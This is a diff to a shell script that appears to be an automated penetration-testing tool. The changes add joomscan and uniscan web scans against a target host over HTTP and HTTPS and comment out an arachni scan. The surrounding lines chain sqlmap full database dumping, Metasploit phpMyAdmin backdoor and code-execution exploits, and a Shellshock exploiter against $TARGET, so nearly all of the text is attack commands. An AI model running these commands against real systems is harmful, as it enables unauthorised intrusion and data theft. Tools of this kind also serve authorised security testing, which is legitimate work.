@@ -487,9 +487,12 @@ else
 		dirb http://$TARGET
 		wpscan --url http://$TARGET --batch
 		wpscan --url http://$TARGET/wordpress/ --batch
+		joomscan -u http://$TARGET
+		joomscan -u http://$TARGET/joomla/
 		python $CMSMAP -t http://$TARGET
 		python $CMSMAP -t http://$TARGET/wordpress/
-		arachni http://$TARGET --output-only-positives
+		#arachni http://$TARGET --output-only-positives
+		uniscan -u http://$TARGET -qweds
 		sqlmap -u "http://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
 		python shocker/shocker.py -H $TARGET --cgilist shocker/shocker-cgi_list --port 80
@@ -633,9 +636,12 @@ else
 		dirb https://$TARGET
 		wpscan --url https://$TARGET --batch
 		wpscan --url https://$TARGET/wordpress/ --batch
+		joomscan -u https://$TARGET
+		joomscan -u https://$TARGET/joomla/
 		python $CMSMAP -t https://$TARGET
 		python $CMSMAP -t https://$TARGET/wordpress/
-		arachni https://$TARGET --output-only-positives
+		#arachni https://$TARGET --output-only-positives
+		uniscan -u https://$TARGET -qweds
 		sqlmap -u "https://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
 		python shocker/shocker.py -H $TARGET --cgilist shocker/shocker-cgi_list --port 443 --ssl
